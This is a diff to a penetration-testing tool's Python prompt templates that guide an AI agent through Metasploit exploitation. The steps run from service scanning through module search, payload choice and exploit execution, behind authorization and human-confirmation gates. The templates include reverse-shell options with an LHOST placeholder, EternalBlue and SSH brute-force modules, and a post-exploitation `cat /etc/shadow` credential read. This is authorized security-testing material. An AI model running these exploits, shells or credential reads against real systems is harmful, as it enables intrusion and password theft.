@@ -528,9 +528,11 @@ STOP — Before proceeding, confirm:
    - Stop immediately if unexpected behavior occurs
 
 ## Step 7 — Post-Exploitation (Authorized Scope Only)
-8. `msf_sessions_list()` — list active sessions
-9. Document: what access was gained, what data is accessible
-10. Do NOT exceed authorized scope — document findings and exit cleanly
+8. `msf_sessions_list()` — list active sessions, note the session_id
+9. `msf_session_cmd(session_id="<id>", command="id")` — confirm access level
+10. `msf_session_cmd(session_id="<id>", command="hostname && uname -a")` — identify system
+11. `msf_session_cmd(session_id="<id>", command="cat /etc/shadow")` — collect evidence (if in scope)
+12. Do NOT exceed authorized scope — stop and document findings
 
 ## Step 8 — Cleanup and Report
 11. Close all sessions after documenting evidence
@@ -540,3 +542,118 @@ STOP — Before proceeding, confirm:
 ## Abort Conditions
 - Stop immediately if: unexpected systems accessed, data outside scope found,
   IDS/WAF triggers excessive alerts, session becomes unstable"""
+
+
+def msf_exploit_workflow(target: str, service: str = "ftp") -> str:
+    """Focused Metasploit exploitation workflow for a specific service.
+
+    Args:
+        target: Target IP or hostname (must be in tengu.toml allowlist).
+        service: Target service type — ftp, smb, http, ssh, or any service name.
+
+    WARNING: Only use against systems you own or have explicit written authorization to test.
+    Human confirmation is REQUIRED before executing any exploit module.
+    """
+    return f"""# Metasploit Exploitation Workflow: {target} [{service.upper()}]
+
+## LEGAL WARNING
+This workflow executes active exploits against {target}.
+Only proceed with EXPLICIT WRITTEN AUTHORIZATION.
+Unauthorized exploitation is a criminal offense in all jurisdictions.
+**A human must confirm before running msf_run_module.**
+
+## Step 1 — Service Enumeration
+1. `nmap_scan(target="{target}", scan_type="version")` — identify exact service version
+   - Confirm {service.upper()} is running and note the exact version string
+   - Check for banners that reveal software and version
+
+## Step 2 — Find Exploits
+2. `msf_search(query="{service}")` — search Metasploit for {service.upper()} modules
+   - Filter by type "exploit" for direct exploitation modules
+   - Note module fullname (e.g. "exploit/unix/ftp/vsftpd_234_backdoor")
+3. `searchsploit_query(query="{service}")` — search Exploit-DB for public PoCs
+   - Cross-reference with Metasploit results for maximum coverage
+
+## Step 3 — Review Module Options
+4. `msf_module_info(module_path="<module-path-from-step-2>")` — inspect module details
+   - Required options: RHOSTS, RPORT, payload
+   - Reliability rank: Excellent > Great > Good > Normal
+   - Available targets and their index numbers
+
+## Step 4 — Choose Payload Strategy
+
+### Bind Shell vs Reverse Shell
+| Scenario | Payload | When to Use |
+|----------|---------|-------------|
+| **Bind shell** | `cmd/unix/interact` | Target cannot reach you (firewall blocks inbound); you connect TO the target |
+| **Reverse shell** | `generic/shell_reverse_tcp` | You can receive inbound connections; target connects back to your LHOST |
+| **Meterpreter reverse** | `linux/x86/meterpreter/reverse_tcp` | Full post-exploitation features (upload/download, port forward, pivot) |
+
+**Bind shell example (vsftpd backdoor, no LHOST needed):**
+```
+module: exploit/unix/ftp/vsftpd_234_backdoor
+payload: cmd/unix/interact
+options: {{"RHOSTS": "{target}"}}
+```
+
+**Reverse shell example (set LHOST to your IP):**
+```
+module: exploit/<path>
+payload: generic/shell_reverse_tcp
+options: {{"RHOSTS": "{target}", "LHOST": "<your-ip>", "LPORT": "4444"}}
+```
+
+## Step 5 — ⚠️ HUMAN CONFIRMATION REQUIRED ⚠️
+```
+STOP — Before proceeding, confirm:
+[ ] Target {target} is in tengu.toml allowed_hosts
+[ ] Written authorization obtained for {target}
+[ ] {service.upper()} version confirmed vulnerable (Step 1 output)
+[ ] Payload strategy chosen (bind or reverse shell)
+[ ] LHOST set correctly if using reverse shell
+```
+
+**Type CONFIRM to proceed to exploitation.**
+
+## Step 6 — Execute Exploit (After Human Confirmation)
+5. `msf_run_module(module_path="<module>", options={{"RHOSTS": "{target}"}}, payload="<payload>")` — run exploit
+   - **session_id is returned automatically** — the tool polls for the new session by UUID,
+     so you do NOT need to call `msf_sessions_list()` separately.
+   - Result example: `{{"success": true, "job_id": 1, "uuid": "...", "session_id": "1"}}`
+   - If `session_id` is absent: exploit ran but no session opened — check options and retry
+
+## Step 7 — Post-Exploitation (Authorized Scope Only)
+6. `msf_session_cmd(session_id="<id>", command="id")` — confirm privilege level
+7. `msf_session_cmd(session_id="<id>", command="whoami")` — confirm username
+8. `msf_session_cmd(session_id="<id>", command="hostname")` — identify target system
+9. Document findings — do NOT exceed authorized scope
+
+## Step 8 — Cleanup and Report
+10. Close sessions after documenting evidence
+11. `generate_report(findings=[...])` — create exploitation evidence report
+
+## Service-Specific Notes
+
+### FTP
+- Common modules: `exploit/unix/ftp/vsftpd_234_backdoor`, `auxiliary/scanner/ftp/anonymous`
+- Default payload for vsftpd backdoor: `cmd/unix/interact` (bind shell, no LHOST needed)
+- Check anonymous FTP login before attempting exploits
+
+### SMB
+- Common modules: `exploit/windows/smb/ms17_010_eternalblue`, `exploit/windows/smb/psexec`
+- Payload: `windows/x64/meterpreter/reverse_tcp` for Meterpreter on 64-bit Windows
+- Requires LHOST/LPORT for reverse payloads
+
+### HTTP
+- Enumerate with `nuclei_scan` and `nikto_scan` first
+- Common modules vary by CMS/framework — use `msf_search(query="<cms-name>")`
+- Often requires authenticated access or specific URL paths
+
+### SSH
+- Brute-force: `auxiliary/scanner/ssh/ssh_login` with credentials
+- Key-based: `auxiliary/scanner/ssh/ssh_enumusers` for username enumeration
+- Version exploits: search for specific OpenSSH/Dropbear CVEs
+
+## Abort Conditions
+- Stop immediately if: unexpected systems accessed, data outside scope found,
+  session becomes unstable, IDS/WAF triggers excessive alerts"""
